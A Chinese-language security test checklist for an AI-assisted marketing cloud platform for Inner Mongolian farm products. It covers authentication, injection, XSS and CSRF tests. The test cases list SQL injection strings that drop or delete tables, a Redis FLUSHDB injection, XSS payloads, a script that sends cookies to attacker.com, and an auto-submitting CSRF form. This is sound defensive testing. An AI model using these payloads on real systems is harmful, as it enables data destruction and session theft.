# 安全测试清单

**项目**: 内蒙古农畜产品品牌营销AI赋能云平台
**版本**: v1.0.0
**编写日期**: [项目完成日期]

---

## 目录

- [1. 认证和授权安全](#1-认证和授权安全)
- [2. 注入攻击防护](#2-注入攻击防护)
- [3. XSS和CSRF防护](#3-xss和csrf防护)
- [4. 敏感数据保护](#4-敏感数据保护)
- [5. API安全](#5-api安全)
- [6. 会话管理安全](#6-会话管理安全)
- [7. 文件上传安全](#7-文件上传安全)
- [8. 安全配置检查](#8-安全配置检查)

---

## 1. 认证和授权安全

### 1.1 密码安全

#### ✅ TC-SEC-AUTH-001: 密码强度验证

**测试步骤**:
1. 尝试注册弱密码

**测试用例**:
| 密码 | 是否通过 | 原因 |
|------|---------|------|
| 12345678 | ❌ | 无字母 |
| abcdefgh | ❌ | 无数字 |
| abc123 | ❌ | 太短（<8位）|
| Test123! | ✅ | 符合要求 |

**验证点**:
- 密码长度≥8字符
- 包含字母和数字
- 特殊字符可选但建议

**实际结果**: _____
**是否通过**: ☐ 是 ☐ 否

---

#### ✅ TC-SEC-AUTH-002: 密码存储安全

**测试步骤**:
1. 注册新用户
2. 查询数据库users表
3. 检查password字段

**验证点**:
- 密码使用bcrypt加密
- 密码字段不可逆
- 不存储明文密码
- 加密强度≥10轮（bcrypt rounds）

**测试SQL**:
```sql
SELECT password FROM users WHERE username = 'test_user';
-- 结果应为: $2b$12$... （bcrypt格式）
```

**实际结果**: _____
**是否通过**: ☐ 是 ☐ 否

---

#### ✅ TC-SEC-AUTH-003: 暴力破解防护

**测试步骤**:
1. 连续5次使用错误密码登录
2. 第6次尝试登录

**验证点**:
- 前5次返回401（密码错误）
- 第6次返回403（账号锁定）
- 锁定时间30分钟
- 错误次数记录在Redis

**实际结果**: _____
**是否通过**: ☐ 是 ☐ 否

---

### 1.2 JWT Token安全

#### ✅ TC-SEC-AUTH-004: Token签名验证

**测试步骤**:
1. 获取有效Token
2. 修改Token payload（例如修改user_id）
3. 使用修改后的Token访问API

**验证点**:
- 返回401
- 错误消息: "认证令牌无效"
- Token签名验证有效

**攻击示例**:
```
原始Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxfQ.xxx
篡改Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo5OTl9.xxx
```

**实际结果**: _____
**是否通过**: ☐ 是 ☐ 否

---

#### ✅ TC-SEC-AUTH-005: Token过期验证

**测试步骤**:
1. 使用过期Token（>30分钟）
2. 访问需要认证的API

**验证点**:
- 返回401
- code: 20003
- 错误消息: "认证令牌已过期"

**实际结果**: _____
**是否通过**: ☐ 是 ☐ 否

---

#### ✅ TC-SEC-AUTH-006: Token黑名单机制

**测试步骤**:
1. 用户登录获取Token
2. 用户登出
3. 使用旧Token访问API

**验证点**:
- 返回401
- Token已加入Redis黑名单
- TTL = Token剩余有效期

**Redis验证**:
```bash
redis-cli
GET blacklist:jwt:<token_id>
# 应返回: "1"
```

**实际结果**: _____
**是否通过**: ☐ 是 ☐ 否

---

### 1.3 权限控制

#### ✅ TC-SEC-AUTH-007: 水平越权防护

**测试步骤**:
1. 用户A登录（user_id=1）
2. 尝试访问用户B的对话（conversation_id=2, 属于user_id=2）
3. GET /api/v1/chat/conversations/2

**验证点**:
- 返回403或404
- 错误消息: "权限不足"或"对话不存在"
- 不泄露对话是否存在

**实际结果**: _____
**是否通过**: ☐ 是 ☐ 否

---

#### ✅ TC-SEC-AUTH-008: 垂直越权防护

**测试步骤**:
1. 普通用户登录（role=user）
2. 尝试创建产品（仅管理员权限）
3. POST /api/v1/products

**验证点**:
- 返回403
- code: 20020
- 错误消息: "权限不足"

**实际结果**: _____
**是否通过**: ☐ 是 ☐ 否

---

## 2. 注入攻击防护

### 2.1 SQL注入测试

#### ✅ TC-SEC-INJ-001: 登录SQL注入

**测试步骤**:
1. 在用户名输入框输入SQL注入payload
2. 尝试登录

**注入Payload**:
| Payload | 目的 |
|---------|------|
| `admin' OR '1'='1` | 绕过密码验证 |
| `admin'--` | 注释掉密码检查 |
| `admin'; DROP TABLE users;--` | 删除表 |
| `1' UNION SELECT password FROM users--` | 数据泄露 |

**验证点**:
- 登录失败
- 不执行SQL注入
- 返回正常错误（用户不存在或密码错误）
- 数据库表完整

**实际结果**: _____
**是否通过**: ☐ 是 ☐ 否

---

#### ✅ TC-SEC-INJ-002: 产品搜索SQL注入

**测试步骤**:
1. 在搜索框输入SQL注入payload
2. GET /api/v1/products?search=<payload>

**注入Payload**:
```
1' OR 1=1--
1' UNION SELECT * FROM users--
1'; DELETE FROM products WHERE '1'='1
```

**验证点**:
- 搜索结果正常或为空
- 不执行恶意SQL
- 参数化查询生效

**ORM验证**（SQLAlchemy）:
```python
# 正确方式（参数化）
products = db.query(Product).filter(Product.name.like(f'%{search}%')).all()

# 错误方式（拼接SQL，易受注入）
products = db.execute(f"SELECT * FROM products WHERE name LIKE '%{search}%'")
```

**实际结果**: _____
**是否通过**: ☐ 是 ☐ 否

---

### 2.2 NoSQL注入测试（Redis）

#### ✅ TC-SEC-INJ-003: Redis命令注入

**测试步骤**:
1. 尝试在输入中注入Redis命令
2. 例如在用户名中输入: `test\r\nFLUSHDB\r\n`

**验证点**:
- Redis命令不被执行
- 输入被转义或过滤
- Redis数据完整

**实际结果**: _____
**是否通过**: ☐ 是 ☐ 否

---

## 3. XSS和CSRF防护

### 3.1 XSS（跨站脚本）测试

#### ✅ TC-SEC-XSS-001: 反射型XSS

**测试步骤**:
1. 在搜索框输入XSS payload
2. 检查搜索结果页面

**XSS Payload**:
| Payload | 目的 |
|---------|------|
| `<script>alert('XSS')</script>` | 弹窗 |
| `<img src=x onerror=alert('XSS')>` | 事件触发 |
| `<iframe src="javascript:alert('XSS')">` | iframe注入 |
| `"><script>document.cookie</script>` | Cookie窃取 |

**验证点**:
- 脚本不执行
- HTML被转义显示
- 前端使用textContent而非innerHTML
- 后端输出时HTML转义

**React防护验证**:
```jsx
// 安全方式
<div>{searchKeyword}</div>  // 自动转义

// 危险方式（不要使用）
<div dangerouslySetInnerHTML={{__html: searchKeyword}} />
```

**实际结果**: _____
**是否通过**: ☐ 是 ☐ 否

---

#### ✅ TC-SEC-XSS-002: 存储型XSS

**测试步骤**:
1. 管理员创建产品，描述字段包含XSS payload
2. 其他用户查看产品详情

**XSS Payload**:
```html
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>
```

**验证点**:
- 描述字段被转义
- 脚本不执行
- 使用Markdown渲染器时配置安全选项

**Markdown安全配置**:
```javascript
import ReactMarkdown from 'react-markdown'

<ReactMarkdown
  disallowedElements={['script', 'iframe']}
  unwrapDisallowed={true}
>
  {description}
</ReactMarkdown>
```

**实际结果**: _____
**是否通过**: ☐ 是 ☐ 否

---

### 3.2 CSRF（跨站请求伪造）测试

#### ✅ TC-SEC-CSRF-001: CSRF Token验证

**测试步骤**:
1. 创建恶意页面
2. 诱导用户访问该页面
3. 页面自动提交请求到API

**恶意页面示例**:
```html
<html>
<body onload="document.forms[0].submit()">
  <form action="http://localhost:8000/api/v1/products" method="POST">
    <input type="hidden" name="name" value="恶意产品">
    <input type="hidden" name="price" value="1">
  </form>
</body>
</html>
```

**验证点**:
- 请求被拒绝（如实现了CSRF Token）
- 或依赖JWT Token（浏览器不会自动携带）
- 检查Origin/Referer Header

**CORS配置**:
```python
# backend/app/main.py
app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:5173"],  # 只允许前端域名
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
```

**实际结果**: _____
**是否通过**: ☐ 是 ☐ 否

---

## 4. 敏感数据保护

### 4.1 数据脱敏

#### ✅ TC-SEC-DATA-001: 邮箱脱敏

**测试步骤**:
1. 用户登录
2. GET /api/v1/auth/me
3. 检查返回的email字段

**验证点**:
- 邮箱显示为: `te***@example.com`
- 前2位+***+@后缀
- 完整邮箱不暴露

**实际结果**: _____
**是否通过**: ☐ 是 ☐ 否

---

#### ✅ TC-SEC-DATA-002: 手机号脱敏

**测试步骤**:
1. GET /api/v1/auth/me
2. 检查phone字段

**验证点**:
- 手机号显示为: `138****8000`
- 前3位+****+后4位

**实际结果**: _____
**是否通过**: ☐ 是 ☐ 否

---

#### ✅ TC-SEC-DATA-003: 密码不返回

**测试步骤**:
1. GET /api/v1/auth/me
2. 检查响应JSON

**验证点**:
- 响应不包含password字段
- 即使是加密后的密码也不返回

**实际结果**: _____
**是否通过**: ☐ 是 ☐ 否

---

### 4.2 HTTPS传输

#### ✅ TC-SEC-DATA-004: HTTPS强制跳转

**测试步骤**:
1. 访问 http://example.com（生产环境）
2. 检查是否重定向到https

**验证点**:
- HTTP自动跳转到HTTPS
- 状态码301或302
- HSTS Header设置

**HSTS Header**:
```
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

**注意**: 本地开发环境（localhost）可使用HTTP

**实际结果**: _____
**是否通过**: ☐ 是 ☐ 否（仅生产环境）

---

## 5. API安全

### 5.1 速率限制

#### ✅ TC-SEC-API-001: 登录接口速率限制

**测试步骤**:
1. 在1分钟内连续发起10次登录请求

**验证点**:
- 前5次正常处理
- 第6次开始返回429
- 错误消息: "请求过于频繁"
- Rate Limit Header:
  ```
  X-RateLimit-Limit: 5
  X-RateLimit-Remaining: 0
  X-RateLimit-Reset: 1642425600
  ```

**实际结果**: _____
**是否通过**: ☐ 是 ☐ 否

---

#### ✅ TC-SEC-API-002: API请求频率限制

**测试步骤**:
1. 快速连续调用产品列表API 100次

**验证点**:
- 超过限制后返回429
- 限制规则（例如：100次/分钟）
- IP级别或用户级别限流

**实际结果**: _____
**是否通过**: ☐ 是 ☐ 否

---

### 5.2 输入验证

#### ✅ TC-SEC-API-003: 参数类型验证

**测试步骤**:
1. 发送错误类型的参数
2. 例如price字段发送字符串而非数字

**测试用例**:
```json
{
  "name": "产品",
  "price": "abc",  // 应为数字
  "stock": "xyz"   // 应为整数
}
```

**验证点**:
- 返回422（FastAPI验证错误）或400
- 明确的错误提示
- 不处理错误类型数据

**实际结果**: _____
**是否通过**: ☐ 是 ☐ 否

---

#### ✅ TC-SEC-API-004: 参数长度限制

**测试步骤**:
1. 发送超长字符串

**测试用例**:
```json
{
  "name": "A" * 10000,  // 超过255字符限制
  "description": "B" * 20000  // 超过2000字符限制
}
```

**验证点**:
- 返回400或422
- 错误消息指出字段超长

**实际结果**: _____
**是否通过**: ☐ 是 ☐ 否

---

### 5.3 错误信息安全

#### ✅ TC-SEC-API-005: 错误信息不泄露敏感数据

**测试步骤**:
1. 触发各种错误（登录失败、数据库错误等）
2. 检查错误响应

**验证点**:
- 不暴露数据库结构
- 不暴露内部路径
- 不暴露SQL语句
- 不暴露堆栈跟踪（生产环境）

**错误示例**（不安全）:
```json
{
  "error": "MySQL Error: Duplicate entry 'test' for key 'users.username'"
}
```

**错误示例**（安全）:
```json
{
  "code": 40011,
  "message": "该用户名已被注册"
}
```

**实际结果**: _____
**是否通过**: ☐ 是 ☐ 否

---

## 6. 会话管理安全

### 6.1 会话固定攻击

#### ✅ TC-SEC-SESSION-001: 登录后Token刷新

**测试步骤**:
1. 登录前获取一个Token（如果有session机制）
2. 登录成功
3. 检查Token是否改变

**验证点**:
- 登录成功后生成新Token
- 旧Token失效
- Session ID变化

**注意**: 本系统使用JWT，每次登录生成新Token

**实际结果**: _____
**是否通过**: ☐ 是 ☐ 否

---

### 6.2 并发会话控制

#### ✅ TC-SEC-SESSION-002: 多设备登录限制

**测试步骤**:
1. 设备A登录
2. 设备B登录同一账号
3. 检查是否支持多设备或踢出旧设备

**验证点**:
- 如允许多设备：两个Token都有效
- 如单设备限制：旧Token失效

**当前策略**: 允许多设备登录

**实际结果**: _____
**是否通过**: ☐ 是 ☐ 否

---

## 7. 文件上传安全

### 7.1 文件类型验证

#### ✅ TC-SEC-FILE-001: 上传恶意文件

**测试步骤**:
1. 尝试上传.php、.exe、.sh文件

**验证点**:
- 只允许指定类型（jpg, png, pdf等）
- 服务端验证MIME类型
- 不依赖文件扩展名

**白名单示例**:
```python
ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'pdf'}
ALLOWED_MIME_TYPES = {'image/jpeg', 'image/png', 'image/gif', 'application/pdf'}
```

**实际结果**: _____
**是否通过**: ☐ 是 ☐ 否（如有文件上传功能）

---

### 7.2 文件大小限制

#### ✅ TC-SEC-FILE-002: 上传超大文件

**测试步骤**:
1. 上传100MB文件（假设限制5MB）

**验证点**:
- 返回413（Payload Too Large）
- 错误消息: "文件大小超过限制"
- 服务器不处理超大文件

**实际结果**: _____
**是否通过**: ☐ 是 ☐ 否

---

## 8. 安全配置检查

### 8.1 HTTP安全Header

#### ✅ TC-SEC-CONFIG-001: 安全Header检查

**测试步骤**:
1. 访问任意API
2. 检查响应Header

**必需的安全Header**:
| Header | 值 | 说明 |
|--------|-----|------|
| X-Content-Type-Options | nosniff | 防止MIME嗅探 |
| X-Frame-Options | DENY | 防止点击劫持 |
| X-XSS-Protection | 1; mode=block | XSS防护 |
| Content-Security-Policy | default-src 'self' | CSP策略 |
| Strict-Transport-Security | max-age=31536000 | HSTS（HTTPS） |

**实际结果**: _____
**是否通过**: ☐ 是 ☐ 否

---

### 8.2 CORS配置

#### ✅ TC-SEC-CONFIG-002: CORS跨域限制

**测试步骤**:
1. 从非授权域名发起请求
2. 例如从 http://evil.com 调用API

**验证点**:
- CORS错误，请求被拒绝
- Access-Control-Allow-Origin只包含授权域名
- 不使用通配符*（生产环境）

**实际结果**: _____
**是否通过**: ☐ 是 ☐ 否

---

### 8.3 默认配置安全

#### ✅ TC-SEC-CONFIG-003: 默认账号检查

**测试步骤**:
1. 尝试使用默认管理员账号登录
2. 例如: admin/admin, root/root

**验证点**:
- 无默认账号或强制修改密码
- 管理员账号密码复杂

**实际结果**: _____
**是否通过**: ☐ 是 ☐ 否

---

#### ✅ TC-SEC-CONFIG-004: 调试模式关闭

**测试步骤**:
1. 检查生产环境配置
2. 触发错误查看堆栈跟踪

**验证点**:
- DEBUG = False（生产环境）
- 不暴露详细错误信息
- 日志记录而非响应

**实际结果**: _____
**是否通过**: ☐ 是 ☐ 否

---

## 安全测试总结

### 测试覆盖率

| 类别 | 测试项 | 通过 | 失败 | 待修复 |
|------|--------|------|------|--------|
| 认证和授权 | 8 | | | |
| 注入攻击 | 3 | | | |
| XSS和CSRF | 3 | | | |
| 敏感数据 | 4 | | | |
| API安全 | 5 | | | |
| 会话管理 | 2 | | | |
| 文件上传 | 2 | | | |
| 安全配置 | 4 | | | |
| **合计** | **31** | **__** | **__** | **__** |

### 风险等级

| 风险等级 | 数量 | 说明 |
|---------|------|------|
| 🔴 高危 | __ | 必须修复 |
| 🟡 中危 | __ | 建议修复 |
| 🟢 低危 | __ | 可延后修复 |

### 修复建议

1. **优先修复高危漏洞**
2. **建议修复项**:
   - [ ] 项目1
   - [ ] 项目2
3. **长期改进**:
   - [ ] 实施安全审计
   - [ ] 定期安全扫描
   - [ ] 安全培训

---

**文档版本**: v1.0
**最后更新**: [项目完成日期]
**维护团队**: 安全团队 + QA团队
